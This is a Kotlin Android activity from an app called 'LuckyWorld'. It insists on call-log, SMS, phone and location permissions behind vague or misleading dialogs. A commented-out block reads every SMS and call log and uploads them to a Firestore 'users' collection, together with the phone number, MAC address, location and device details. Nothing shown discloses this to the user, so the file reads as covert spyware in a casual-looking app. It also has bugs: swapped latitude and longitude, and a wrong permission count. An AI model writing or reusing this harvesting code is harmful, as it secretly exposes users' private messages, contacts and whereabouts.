package com.mind.luckyworld.view.activity

import android.annotation.SuppressLint
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.databinding.DataBindingUtil
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mind.luckyworld.R
import com.mind.luckyworld.constant.Permission
import com.mind.luckyworld.databinding.ActivityLuckyWorldBinding
import com.mind.luckyworld.model.CallLog
import com.mind.luckyworld.model.DeviceDetails
import com.mind.luckyworld.model.SmsLog
import com.mind.luckyworld.utils.*
import java.util.*
import kotlin.collections.HashMap


class LuckWorldActivity : AppCompatActivity(), PermissionListener, LocationListener {

    companion object {
        private const val REQUEST_CODE_MULTIPLE = 101
        const val SETTING_REQUEST_CODE = 101
    }

    private val firebaseFirestore: FirebaseFirestore by lazy {
        FirebaseFirestore.getInstance()
    }
    private lateinit var navController: NavController
    private var mDeniedPermissionList = arrayListOf<String>()
    private var mGrantedPermissionList = arrayListOf<String>()
    private var mPermissionListWithNeverAsk = arrayListOf<String>()
    private lateinit var permissionUtils: PermissionUtils
    private lateinit var locationManager: LocationManager
    public var mLocation = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val binding: ActivityLuckyWorldBinding = DataBindingUtil.setContentView(
            this,
            R.layout.activity_lucky_world
        )
        if (savedInstanceState == null)
            setupPermissions()

        navController = findNavController(R.id.nav_fragment)
    }

    override fun onSaveInstanceState(outState: Bundle) {
        outState.putBoolean("isCalled", true)
        super.onSaveInstanceState(outState)
    }

    private fun setupPermissions() {
        permissionUtils = PermissionUtils.Builder()
            .with(this)
            .requestCode(Companion.REQUEST_CODE_MULTIPLE)
            .setPermissionResultCallback(this)
            .askFor(Permission.CALLLOG, Permission.LOCATION, Permission.PHONE, Permission.SMS)
            .rationalMessage("Permissions are required for app to work properly")
            .build()
        permissionUtils.requestPermissions()
    }

    override fun onPermissionsGranted(requestCode: Int, acceptedPermissionList: ArrayList<String>) {
        mGrantedPermissionList.clear()
        mGrantedPermissionList.addAll(acceptedPermissionList)
        if (mGrantedPermissionList.size == 5) {
            initData()
        }
    }

    override fun onPermissionsDenied(requestCode: Int, deniedPermissionList: ArrayList<String>) {
        mDeniedPermissionList.clear()
        mDeniedPermissionList.addAll(deniedPermissionList)
        if (mDeniedPermissionList.size > 0)
            showDialog(this,
                "Permission to read phone state and access storage required for this app to be functional",
                "Allow",
                "Cancel",
                DialogInterface.OnClickListener { _, _ -> setupPermissions() },
                DialogInterface.OnClickListener { dialog, _ ->
                    dialog.dismiss()
                    finish()
                })!!.show()
        else {
            initData()
        }
    }

    @SuppressLint("MissingPermission")
    private fun initData() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            val location: Location =
                locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
            onLocationChanged(location)
        } catch (e: Exception) {
            Log.e(this@LuckWorldActivity::class.java.simpleName, e.message, e)
        }

        /*val uid = getWifiMacAddress()
        val collectionReference = firebaseFirestore.collection("users")
        val documentReference = collectionReference.document().collection("smsLogs")
        val mList: List<SmsLog> = getAllSms(this)
        if (mList.isNotEmpty()) {
            var i = 0
            mList.forEach {
                documentReference.document("${i++}").set(it, SetOptions.merge())
            }
        }

        val documentRef = firebaseFirestore.collection("users").document(uid).collection("callLogs")
        val mCallList: List<CallLog> = getCallDetails(this)
        if (mCallList.isNotEmpty()) {
            var i = 0
            mCallList.forEach {
                documentRef.document("${i++}").set(it, SetOptions.merge())
            }
        }
        val deviceDetails = DeviceDetails(
            getDeviceName(),
            getWifiMacAddress(),
            mLocation,
            getMemoryInfo(this@LuckWorldActivity),
            getBatteryLevel(this@LuckWorldActivity),
            getPhoneNumber(this@LuckWorldActivity)
        )
        val docRef = firebaseFirestore.collection("users")
            val refe = docRef.document()
        refe.set(deviceDetails)

        val a = refe.collection("callLogs")
        val map: MutableMap<String, Any> = mutableMapOf("1" to "a", "2" to "b")
        a.document("0").set(map)
//        val a = refe.collection("devicedetails")
        *//*val deviceDetails = DeviceDetails(
            getDeviceName(),
            getWifiMacAddress(),
            mLocation,
            getMemoryInfo(this@LuckWorldActivity),
            getBatteryLevel(this@LuckWorldActivity),
            getPhoneNumber(this@LuckWorldActivity)
        )*//*
//        a.document("0").set(deviceDetails, SetOptions.merge())*/


    }

    override fun onPermissionDeniedWithNeverAsk(
        requestCode: Int,
        deniedPermissionListWithNeverAsk: ArrayList<String>
    ) {
        mPermissionListWithNeverAsk.clear()
        mPermissionListWithNeverAsk.addAll(deniedPermissionListWithNeverAsk)
        if (mPermissionListWithNeverAsk.size > 0) {
            showDialog(this,
                "\"We noticed you have disabled our permission.\n" +
                        "We will take you to the Application settings,\n" +
                        "where you can re-enable the permissions.\"",
                "Allow",
                "",
                DialogInterface.OnClickListener { _, _ -> goToSettings() },
                DialogInterface.OnClickListener { _, _ -> })!!.show()
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == Companion.SETTING_REQUEST_CODE) {
            setupPermissions()
            if (mPermissionListWithNeverAsk.size > 0)
                finish()
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        permissionUtils.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    private fun goToSettings() {
        val intent = Intent(
            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
            Uri.fromParts("package", packageName, null)
        )
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivityForResult(intent, Companion.SETTING_REQUEST_CODE)
    }

    override fun onLocationChanged(location: Location?) {
        mLocation = "longitude ${location?.latitude} \n latitude ${location?.longitude}"
    }

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String?) {}

    override fun onProviderDisabled(provider: String?) {}

}
